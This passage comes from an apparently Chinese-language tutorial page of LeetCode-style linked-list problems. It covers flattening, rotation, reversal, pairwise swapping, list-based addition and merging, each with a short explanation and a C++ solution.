id="扁平化多级双向链表">扁平化多级双向链表</h2><blockquote><p>首先检查给定的头节点是否为空，如果为空，则返回<code>head</code>。然后，它遍历链表中的每个节点，如果找到一个节点有子节点，它会递归调用<code>flatten</code>来扁平化这个子链表。扁平化的子链表被插入到当前节点和其下一个节点之间。这个过程中会相应地更新前后节点的<code>prev</code>和<code>next</code>指针，确保链表的双向链接性质保持不变。最后，函数返回扁平化后的链表的头节点。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">Node* <span class="hljs-title">flatten</span><span class="hljs-params">(Node* head)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (!head) <span class="hljs-keyword">return</span> head;<br><br>        Node* currentNode = head;<br>        <span class="hljs-keyword">while</span> (currentNode != <span class="hljs-literal">nullptr</span>) &#123;<br>            <span class="hljs-keyword">if</span> (currentNode-&gt;child) &#123;<br>                <span class="hljs-comment">// 扁平化子链表（递归）</span><br>                Node* child = <span class="hljs-built_in">flatten</span>(currentNode-&gt;child);<br><br>                <span class="hljs-comment">// 保存当前节点的下一个节点，以便后续连接</span><br>                Node* next = currentNode-&gt;next;<br><br>                <span class="hljs-comment">// 将扁平化的子链表连接到当前节点的next，并更新节点状态</span><br>                currentNode-&gt;next = child;<br>                child-&gt;prev = currentNode;<br>                currentNode-&gt;child = <span class="hljs-literal">nullptr</span>;<br><br>                <span class="hljs-comment">// 将原来的next节点连接到扁平化链表的末端，并更新节点状态</span><br>                Node* tail = child;<br>                <span class="hljs-keyword">while</span> (tail-&gt;next != <span class="hljs-literal">nullptr</span>) &#123;<br>                    tail = tail-&gt;next;<br>                &#125;<br>                tail-&gt;next = next;<br>                <span class="hljs-keyword">if</span> (next) next-&gt;prev = tail;<br>            &#125;<br>            <span class="hljs-comment">// 移动到下一个节点</span><br>            currentNode = currentNode-&gt;next;<br>        &#125;<br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="二叉树展开为链表">二叉树展开为链表</h2><blockquote><p>法一：将二叉树展开为单链表之后，单链表中的节点顺序即为二叉树的前序遍历访问各节点的顺序。因此，可以对二叉树进行前序遍历，获得各节点被访问到的顺序。由于将二叉树展开为链表之后会破坏二叉树的结构，因此在前序遍历结束之后更新每个节点的左右子节点的信息，将二叉树展开为单链表。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">flatten</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        vector&lt;TreeNode*&gt; l;<br>        <span class="hljs-built_in">preorderTraversal</span>(root, l);<br>        <span class="hljs-type">int</span> n = l.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; n; i++) &#123;<br>            TreeNode* prev = l[i - <span class="hljs-number">1</span>];<br>            TreeNode* curr = l[i];<br>            prev-&gt;left = <span class="hljs-literal">nullptr</span>;<br>            prev-&gt;right = curr;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">preorderTraversal</span><span class="hljs-params">(TreeNode* root, vector&lt;TreeNode*&gt;&amp; l)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (root != <span class="hljs-literal">NULL</span>) &#123;<br>            l.<span class="hljs-built_in">push_back</span>(root);<br>            <span class="hljs-built_in">preorderTraversal</span>(root-&gt;left, l);<br>            <span class="hljs-built_in">preorderTraversal</span>(root-&gt;right, l);<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>法二：</p><ol type="1"><li>首先判断根节点是否为空，如果为空则直接返回。</li><li>获取根节点的左子树和右子树。</li><li>如果左子树或右子树不为空，则将根节点的左子树置为空，右子树置为原来的左子树。</li><li>递归地对左子树和右子树进行展开操作。</li><li>在展开完成后，找到当前根节点的最右子节点，将其右子树置为原来的右子树。</li></ol></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">flatten</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (root != <span class="hljs-literal">NULL</span>) &#123;<br>            TreeNode* left = root-&gt;left;<br>            TreeNode* right = root-&gt;right;<br>            <span class="hljs-keyword">if</span> (left != <span class="hljs-literal">NULL</span> || right != <span class="hljs-literal">NULL</span>) &#123;<br>                root-&gt;left = <span class="hljs-literal">NULL</span>;<br>                root-&gt;right = left;<br>                <span class="hljs-built_in">flatten</span>(left);<br>                <span class="hljs-built_in">flatten</span>(right);<br>                TreeNode* cur = root;<br>                <span class="hljs-keyword">while</span> (cur-&gt;right != <span class="hljs-literal">NULL</span>) &#123;<br>                    cur = cur-&gt;right;<br>                &#125;<br>                cur-&gt;right = right;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="链表的旋转与反转">3. 链表的旋转与反转</h1><h2 id="旋转链表">旋转链表</h2><blockquote><p>将给定的链表连接成环，然后将指定位置断开。记给定链表的长度为n，注意到当向右移动的次数 k≥n 时，我们仅需要向右移动 k mod n次即可。因为每 n次移动都会让链表变为原状。这样我们可以知道，新链表的最后一个节点为原链表的第(n−1)−(k mod n) 个节点（从 0 开始计数）。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">rotateRight</span><span class="hljs-params">(ListNode* head, <span class="hljs-type">int</span> k)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (k == <span class="hljs-number">0</span> || head == <span class="hljs-literal">nullptr</span> || head-&gt;next == <span class="hljs-literal">nullptr</span>) &#123;<br>            <span class="hljs-keyword">return</span> head;<br>        &#125;<br>        <span class="hljs-type">int</span> n = <span class="hljs-number">1</span>;<br>        ListNode* iter = head;<br>        <span class="hljs-keyword">while</span> (iter-&gt;next != <span class="hljs-literal">nullptr</span>) &#123;<br>            iter = iter-&gt;next;<br>            n++;<br>        &#125;<br>        <span class="hljs-type">int</span> add = n - k % n;<br>        <span class="hljs-keyword">if</span> (add == n) &#123;<br>            <span class="hljs-keyword">return</span> head;<br>        &#125;<br>        iter-&gt;next = head;<br>        <span class="hljs-keyword">while</span> (add--) &#123;<br>            iter = iter-&gt;next;<br>        &#125;<br>        ListNode* ret = iter-&gt;next;<br>        iter-&gt;next = <span class="hljs-literal">nullptr</span>;<br>        <span class="hljs-keyword">return</span> ret;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="两两交换链表中的节点">两两交换链表中的节点</h2><blockquote><p>法一：通过迭代的方式实现两两交换链表中的节点。需要创建一个前驱节点temp，从而把整个链表连接起来。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">swapPairs</span><span class="hljs-params">(ListNode* head)</span> </span>&#123;<br>        ListNode* dummyHead = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(<span class="hljs-number">0</span>);<br>        dummyHead-&gt;next = head;<br>        ListNode* temp = dummyHead;<br>        <span class="hljs-keyword">while</span> (temp-&gt;next != <span class="hljs-literal">nullptr</span> &amp;&amp; temp-&gt;next-&gt;next != <span class="hljs-literal">nullptr</span>) &#123;<br>            ListNode* node1 = temp-&gt;next;<br>            ListNode* node2 = temp-&gt;next-&gt;next;<br>            temp-&gt;next = node2;<br>            node1-&gt;next = node2-&gt;next;<br>            node2-&gt;next = node1;<br>            temp = node1;<br>        &#125;<br>        ListNode* ans = dummyHead-&gt;next;<br>        <span class="hljs-keyword">delete</span> dummyHead;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>法二：递归。递归的终止条件是链表中没有节点，或者链表中只有一个节点，此时无法进行交换。如果链表中至少有两个节点，则在两两交换链表中的节点之后，原始链表的头节点变成新的链表的第二个节点，原始链表的第二个节点变成新的链表的头节点。链表中的其余节点的两两交换可以递归地实现。在对链表中的其余节点递归地两两交换之后，更新节点之间的指针关系，即可完成整个链表的两两交换。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">swapPairs</span><span class="hljs-params">(ListNode* head)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">nullptr</span> || head-&gt;next == <span class="hljs-literal">nullptr</span>) &#123;<br>            <span class="hljs-keyword">return</span> head;<br>        &#125;<br>        ListNode* newHead = head-&gt;next;<br>        head-&gt;next = <span class="hljs-built_in">swapPairs</span>(newHead-&gt;next);<br>        newHead-&gt;next = head;<br>        <span class="hljs-keyword">return</span> newHead;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="反转链表">反转链表</h2><blockquote><p>在遍历链表时，将当前节点的 next指针改为指向前一个节点。由于节点没有引用其前一个节点，因此必须事先存储其前一个节点。在更改引用之前，还需要存储后一个节点。最后返回新的头引用。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">reverseList</span><span class="hljs-params">(ListNode* head)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (!head || !head-&gt;next) &#123;<br>            <span class="hljs-keyword">return</span> head;<br>        &#125;<br>        ListNode* prev = <span class="hljs-literal">NULL</span>;<br>        ListNode* cur = head;<br>        <span class="hljs-keyword">while</span> (cur) &#123;<br>            ListNode* next = cur-&gt;next;<br>            cur-&gt;next = prev;<br>            prev = cur;<br>            cur = next;<br>        &#125;<br>        <span class="hljs-keyword">return</span> prev;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="反转链表ii">反转链表II</h2><blockquote><p>在需要反转的区间里，每遍历到一个节点，让这个新节点来到反转部分的起始位置。</p><p>变量说明：</p><ul><li>curr：指向待反转区域的第一个节点 left；</li><li>next：永远指向 curr 的下一个节点，循环过程中，curr 变化以后 next会变化；</li><li>pre：永远指向待反转区域的第一个节点 left的前一个节点，在循环过程中不变。</li></ul><p>操作步骤：</p><ul><li>先将 curr 的下一个节点记录为 next；</li><li>执行操作 ①：把 curr 的下一个节点指向 next 的下一个节点；</li><li>执行操作 ②：把 next 的下一个节点指向 pre 的下一个节点；</li><li>执行操作 ③：把 pre 的下一个节点指向 next。</li></ul></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">reverseBetween</span><span class="hljs-params">(ListNode* head, <span class="hljs-type">int</span> left, <span class="hljs-type">int</span> right)</span> </span>&#123;<br>        ListNode* dummyHead = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(<span class="hljs-number">-1</span>, head);<br>        ListNode* pre = dummyHead;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; left - <span class="hljs-number">1</span>; i++) &#123;<br>            pre = pre-&gt;next;<br>        &#125;<br>        ListNode* cur = pre-&gt;next;<br>        ListNode* next;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; right - left; i++) &#123;<br>            next = cur-&gt;next;<br>            cur-&gt;next = next-&gt;next;<br>            next-&gt;next = pre-&gt;next;<br>            pre-&gt;next = next;<br>        &#125;<br>        <span class="hljs-keyword">return</span> dummyHead-&gt;next;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="k-个一组翻转链表">K 个一组翻转链表</h2><blockquote><p>通过一次遍历计算长度，再进行分组反转。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">reverseKGroup</span><span class="hljs-params">(ListNode* head, <span class="hljs-type">int</span> k)</span> </span>&#123;<br>        ListNode* dummyHead = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(<span class="hljs-number">-1</span>, head);<br>        ListNode* cur = dummyHead;<br>        <span class="hljs-type">int</span> size = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (cur-&gt;next) &#123;<br>            cur = cur-&gt;next;<br>            size++;<br>        &#125;<br>        <span class="hljs-type">int</span> count = size / k;<br>        ListNode* pre = dummyHead;<br>        cur = pre-&gt;next;<br>        <span class="hljs-keyword">while</span> (count--) &#123;<br>            ListNode* next = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>();<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; k - <span class="hljs-number">1</span>; i++) &#123;<br>                next = cur-&gt;next;<br>                cur-&gt;next = next-&gt;next;<br>                next-&gt;next = pre-&gt;next;<br>                pre-&gt;next = next;<br>            &#125;<br>            pre = cur;<br>            cur = cur-&gt;next;<br>        &#125;<br>        <span class="hljs-keyword">return</span> dummyHead-&gt;next;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="链表高精度加法">4. 链表高精度加法</h1><h2 id="两数相加">两数相加</h2><blockquote><p>逆序存储：第一位实际上是数字的最低位。相加的过程中注意不要漏掉进位。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">addTwoNumbers</span><span class="hljs-params">(ListNode* l1, ListNode* l2)</span> </span>&#123;<br>        ListNode* head = <span class="hljs-literal">nullptr</span>;<br>        ListNode* tail = <span class="hljs-literal">nullptr</span>;<br>        <span class="hljs-type">int</span> carry = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (l1 || l2) &#123;<br>            <span class="hljs-type">int</span> n1 = l1 ? l1-&gt;val : <span class="hljs-number">0</span>;<br>            <span class="hljs-type">int</span> n2 = l2 ? l2-&gt;val : <span class="hljs-number">0</span>;<br>            <span class="hljs-type">int</span> sum = n1 + n2 + carry;<br>            <span class="hljs-keyword">if</span> (!head) &#123;<br>                head = tail = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(sum % <span class="hljs-number">10</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                tail-&gt;next = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(sum % <span class="hljs-number">10</span>);<br>                tail = tail-&gt;next;<br>            &#125;<br>            carry = sum / <span class="hljs-number">10</span>;<br>            <span class="hljs-keyword">if</span> (l1) &#123;<br>                l1 = l1-&gt;next;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (l2) &#123;<br>                l2 = l2-&gt;next;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (carry &gt; <span class="hljs-number">0</span>) &#123;<br>            tail-&gt;next = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(carry);<br>        &#125;<br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="两数相加ii">两数相加II</h2><blockquote><p>链表中数位的顺序与我们做加法的顺序是相反的，为了逆序处理所有数位，我们可以使用栈：把所有数字压入栈中，再依次取出相加。计算过程中需要注意进位的情况。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">addTwoNumbers</span><span class="hljs-params">(ListNode* l1, ListNode* l2)</span> </span>&#123;<br>        stack&lt;<span class="hljs-type">int</span>&gt; s1, s2;<br>        <span class="hljs-keyword">while</span> (l1) &#123;<br>            s1.<span class="hljs-built_in">push</span>(l1-&gt;val);<br>            l1 = l1-&gt;next;<br>        &#125;<br>        <span class="hljs-keyword">while</span> (l2) &#123;<br>            s2.<span class="hljs-built_in">push</span>(l2-&gt;val);<br>            l2 = l2-&gt;next;<br>        &#125;<br>        <span class="hljs-type">int</span> carry = <span class="hljs-number">0</span>;<br>        ListNode* ans = <span class="hljs-literal">nullptr</span>;<br>        <span class="hljs-keyword">while</span> (!s1.<span class="hljs-built_in">empty</span>() || !s2.<span class="hljs-built_in">empty</span>() || carry != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-type">int</span> a = s1.<span class="hljs-built_in">empty</span>() ? <span class="hljs-number">0</span> : s1.<span class="hljs-built_in">top</span>();<br>            <span class="hljs-type">int</span> b = s2.<span class="hljs-built_in">empty</span>() ? <span class="hljs-number">0</span> : s2.<span class="hljs-built_in">top</span>();<br>            <span class="hljs-keyword">if</span> (!s1.<span class="hljs-built_in">empty</span>()) &#123;<br>                s1.<span class="hljs-built_in">pop</span>();<br>            &#125;<br>            <span class="hljs-keyword">if</span> (!s2.<span class="hljs-built_in">empty</span>()) &#123;<br>                s2.<span class="hljs-built_in">pop</span>();<br>            &#125;<br>            <span class="hljs-type">int</span> sum = a + b + carry;<br>            ListNode* curnode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(sum % <span class="hljs-number">10</span>);<br>            curnode-&gt;next = ans;<br>            ans = curnode;<br>            carry = sum / <span class="hljs-number">10</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="链表的合并">5.链表的合并</h1><h2 id="合并两个有序链表">合并两个有序链表</h2><blockquote><p>创建了一个dummyHead节点作为新链表的哑节点，并且维护一个指针tail指向新链表的尾节点。然后，通过比较l1和l2节点的值，逐个将较小值的节点添加到新链表的尾部，直到其中一个链表遍历完毕。最后，将剩余的链表连接到新链表的尾部，并返回新链表的头节点。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">mergeTwoLists</span><span class="hljs-params">(ListNode* list1, ListNode* list2)</span> </span>&#123;<br>        ListNode* dummyHead = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>();<br>        ListNode* tail = dummyHead;<br>        <span class="hljs-keyword">while</span> (list1 &amp;&amp; list2) &#123;<br>            <span class="hljs-keyword">if</span> (list1-&gt;val &lt; list2-&gt;val) &#123;<br>                tail-&gt;next = list1;<br>                list1 = list1-&gt;next;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                tail-&gt;next = list2;<br>                list2 = list2-&gt;next;<br>            &#125;<br>            tail = tail-&gt;next;<br>        &#125;<br>        tail-&gt;next = list1 ? list1 : list2;<br>        <span class="hljs-keyword">return</span> dummyHead-&gt;next;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="合并k个排序链表">合并K个排序链表</h2><blockquote><p>用一个变量 <em>ans</em> 来维护已经合并的链表，第 <em>i</em>次循环把第 <em>i</em> 个链表和 <em>ans</em> 合并，答案保存到<em>ans</em> 中。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">mergeTwoLists</span><span class="hljs-params">(ListNode* list1, ListNode* list2)</span> </span>&#123;<br>        ListNode* dummyHead = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>();<br>        ListNode* tail = dummyHead;<br>        <span class="hljs-keyword">while</span> (list1 &amp;&amp; list2) &#123;<br>            <span class="hljs-keyword">if</span> (list1-&gt;val &lt; list2-&gt;val) &#123;<br>                tail-&gt;next = list1;<br>                list1 = list1-&gt;next;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                tail-&gt;next = list2;<br>                list2 = list2-&gt;next;<br>            &#125;<br>            tail = tail-&gt;next;<br>        &#125;<br>        tail-&gt;next = list1 ? list1 : list2;<br>        <span class="hljs-keyword">return</span> dummyHead-&gt;next;<br>    &#125;<br>    <span class="hljs-function">ListNode* <span class="hljs-title">mergeKLists</span><span class="hljs-params">(vector&lt;ListNode*&gt;&amp; lists)</span> </span>&#123;<br>        ListNode* ans = <span class="hljs-literal">nullptr</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; lists.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            ans = <span class="hljs-built_in">mergeTwoLists</span>(ans, lists[i]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="链表中的双指针技巧">6.链表中的双指针技巧</h1><h2 id="分隔链表">分隔链表</h2><blockquote><p>创建两个新的链表，一个用于存储小于 x 的节点，另一个用于存储大于或等于x 的节点，然后将这两个链表连接起来。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td 